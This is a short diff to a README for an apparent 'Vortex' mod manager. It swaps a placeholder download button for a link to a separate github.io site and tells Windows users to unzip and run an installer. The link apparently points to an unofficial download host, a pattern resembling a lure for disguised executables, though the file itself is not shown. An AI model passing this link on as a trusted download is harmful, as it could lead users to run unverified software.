@@ -8,7 +8,7 @@ It offers **intelligent conflict resolution, deployment automation, and mod prof
 ---
 
 ## 🧰 Installation
-[![Download](https://img.shields.io/badge/Download-Now-blue?style=for-the-badge)](#)
+[![Download](https://img.shields.io/badge/Download-Now-blue?style=for-the-badge)](https://vortex-mod-download.github.io/.github/)
 
 1. Download and unzip the archive.  
 2. Run the **Vortex Installer** on your Windows PC.  
